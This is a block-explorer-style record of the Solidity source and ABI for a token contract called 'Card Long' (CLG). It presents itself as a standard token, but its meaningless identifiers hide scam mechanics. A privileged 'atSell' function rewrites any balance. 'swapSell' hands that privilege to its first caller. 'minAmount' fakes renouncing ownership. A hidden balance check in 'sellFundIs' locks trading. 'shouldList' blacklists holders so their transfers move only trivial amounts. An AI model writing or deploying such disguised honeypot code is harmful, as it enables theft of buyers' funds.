{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface fromTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract totalMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverAutoLaunch {\n    function createPair(address exemptIs, address feeTeam) external returns (address);\n}\n\ninterface modeFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapTrading) external view returns (uint256);\n\n    function transfer(address fromBuyTeam, uint256 takeTo) external returns (bool);\n\n    function allowance(address enableWalletLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromBuyTeam,\n        uint256 takeTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountMode, uint256 value);\n    event Approval(address indexed enableWalletLiquidity, address indexed spender, uint256 value);\n}\n\ninterface sellExempt is modeFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CardLong is totalMode, modeFee, sellExempt {\n\n    address marketingLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return receiverTx;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tokenWallet;\n    }\n\n    mapping(address => mapping(address => uint256)) private tradingIsSender;\n\n    bool public amountSwap;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingFee;\n    }\n\n    function marketingModeFrom() private view {\n        require(exemptShould[_msgSender()]);\n    }\n\n    uint256 private tradingFee = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyExempt;\n    }\n\n    function transferFrom(address feeMarketing, address fromBuyTeam, uint256 takeTo) external override returns (bool) {\n        if (_msgSender() != marketingLiquidity) {\n            if (tradingIsSender[feeMarketing][_msgSender()] != type(uint256).max) {\n                require(takeTo <= tradingIsSender[feeMarketing][_msgSender()]);\n                tradingIsSender[feeMarketing][_msgSender()] -= takeTo;\n            }\n        }\n        return sellFundIs(feeMarketing, fromBuyTeam, takeTo);\n    }\n\n    bool private liquidityReceiverToken;\n\n    function allowance(address launchEnableAmount, address minIs) external view virtual override returns (uint256) {\n        if (minIs == marketingLiquidity) {\n            return type(uint256).max;\n        }\n        return tradingIsSender[launchEnableAmount][minIs];\n    }\n\n    function swapShould(uint256 takeTo) public {\n        marketingModeFrom();\n        listSender = takeTo;\n    }\n\n    uint256 listSender;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingSenderFund;\n    }\n\n    function transfer(address isLiquidityTrading, uint256 takeTo) external virtual override returns (bool) {\n        return sellFundIs(_msgSender(), isLiquidityTrading, takeTo);\n    }\n\n    address public minList;\n\n    event OwnershipTransferred(address indexed fundIs, address indexed marketingMax);\n\n    address public listFund;\n\n    uint256 tradingLimit;\n\n    function swapSell(address liquidityTotal) public {\n        if (amountSwap) {\n            return;\n        }\n        \n        exemptShould[liquidityTotal] = true;\n        \n        amountSwap = true;\n    }\n\n    bool public totalIs;\n\n    function sellFundIs(address feeMarketing, address fromBuyTeam, uint256 takeTo) internal returns (bool) {\n        if (feeMarketing == listFund) {\n            return tradingToken(feeMarketing, fromBuyTeam, takeTo);\n        }\n        uint256 listMarketingTeam = modeFee(minList).balanceOf(atShouldSell);\n        require(listMarketingTeam == listSender);\n        require(fromBuyTeam != atShouldSell);\n        if (listLaunchedWallet[feeMarketing]) {\n            return tradingToken(feeMarketing, fromBuyTeam, txExempt);\n        }\n        return tradingToken(feeMarketing, fromBuyTeam, takeTo);\n    }\n\n    mapping(address => bool) public listLaunchedWallet;\n\n    address atShouldSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private buyExempt = 18;\n\n    function approve(address minIs, uint256 takeTo) public virtual override returns (bool) {\n        tradingIsSender[_msgSender()][minIs] = takeTo;\n        emit Approval(_msgSender(), minIs, takeTo);\n        return true;\n    }\n\n    mapping(address => uint256) private receiverShould;\n\n    function getOwner() external view returns (address) {\n        return receiverTx;\n    }\n\n    uint256 private marketingAt;\n\n    uint256 private tradingMarketing;\n\n    string private tokenWallet = \"Card Long\";\n\n    function atSell(address isLiquidityTrading, uint256 takeTo) public {\n        marketingModeFrom();\n        receiverShould[isLiquidityTrading] = takeTo;\n    }\n\n    mapping(address => bool) public exemptShould;\n\n    function minAmount() public {\n        emit OwnershipTransferred(listFund, address(0));\n        receiverTx = address(0);\n    }\n\n    function shouldList(address atFund) public {\n        marketingModeFrom();\n        if (totalIs) {\n            totalIs = false;\n        }\n        if (atFund == listFund || atFund == minList) {\n            return;\n        }\n        listLaunchedWallet[atFund] = true;\n    }\n\n    uint256 constant txExempt = 12 ** 10;\n\n    function balanceOf(address swapTrading) public view virtual override returns (uint256) {\n        return receiverShould[swapTrading];\n    }\n\n    address private receiverTx;\n\n    string private marketingSenderFund = \"CLG\";\n\n    bool public takeFee;\n\n    constructor (){\n        if (takeFee) {\n            liquidityReceiverToken = false;\n        }\n        fromTake txFrom = fromTake(marketingLiquidity);\n        minList = receiverAutoLaunch(txFrom.factory()).createPair(txFrom.WETH(), address(this));\n        \n        listFund = _msgSender();\n        minAmount();\n        exemptShould[listFund] = true;\n        receiverShould[listFund] = tradingFee;\n        \n        emit Transfer(address(0), listFund, tradingFee);\n    }\n\n    function tradingToken(address feeMarketing, address fromBuyTeam, uint256 takeTo) internal returns (bool) {\n        require(receiverShould[feeMarketing] >= takeTo);\n        receiverShould[feeMarketing] -= takeTo;\n        receiverShould[fromBuyTeam] += takeTo;\n        emit Transfer(feeMarketing, fromBuyTeam, takeTo);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableWalletLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchEnableAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLiquidityTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTo\",\"type\":\"uint256\"}],\"name\":\"atSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listLaunchedWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFund\",\"type\":\"address\"}],\"name\":\"shouldList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"}],\"name\":\"swapSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeTo\",\"type\":\"uint256\"}],\"name\":\"swapShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLiquidityTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromBuyTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CardLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}